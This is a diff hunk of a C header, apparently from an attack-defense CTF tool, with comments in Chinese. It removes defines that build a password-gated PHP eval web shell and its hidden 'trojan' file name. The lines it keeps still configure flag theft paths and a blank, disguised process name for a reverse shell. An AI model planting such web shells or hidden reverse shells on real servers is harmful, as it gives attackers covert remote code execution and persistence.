@@ -45,9 +45,6 @@
 // #define SECRET "xia0ji233"                                  //密码
 #define FLAG_PATH "/flag"                                   //flag路径
 #define WWWROOT "/var/www/html/"                            // end of /
-#define CONTENT_PREFIX "<?php if(md5($_GET['pass'])==='"
-#define CONTENT_SUFIX "'){@eval($_POST['xia0ji233']);}?>"
-#define PHP_NAME ".xia0ji233.php"                           //木马文件名
 #define FLAG_DIR WWWROOT ".xia0ji233/"                      //加密flag存放目录（web不能对外连接时使用）
 #define FLAG_FILE FLAG_DIR "flag"                            //加密flag文件路径
 #define SHELL_NAME "                               "        //反弹shell的进程名
